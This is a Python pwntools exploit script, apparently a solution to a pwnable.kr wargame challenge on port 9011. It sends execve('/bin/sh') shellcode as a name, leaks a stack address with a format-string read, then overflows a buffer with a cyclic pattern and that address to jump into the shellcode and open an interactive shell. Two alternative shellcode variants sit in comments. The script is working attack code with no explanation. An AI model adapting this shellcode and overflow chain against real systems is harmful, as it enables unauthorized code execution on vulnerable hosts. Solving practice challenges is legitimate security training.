from pwn import *

io = remote('pwnable.kr', 9011)
select_menu = lambda choice: io.sendlineafter(b'> ', str(choice).encode())
input_name = lambda name: io.sendlineafter(b"what's your name? : ", name)
shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
# shellcode = b'H1\xf6\xf7\xe6PH\xbb/bin//shST_\xb0;\x0f\x05'
# shellcode = b'H1\xf6\xf7\xe6H\xbb/bin/sh\x00ST_\xb0;\x0f\x05'
input_name(shellcode)
select_menu(2)
io.recvline()  # hello
io.sendline(b'%10$p')
addr = int(io.recvline().strip(), 16)-0x20
select_menu(4)
io.sendlineafter(b'(y/n)', b'n')  # Are you sure you want to exit? (y/n)
select_menu(3)
io.recvline()  # hello 
payload = cyclic(24) + p64(addr)
io.sendline(payload)
io.interactive()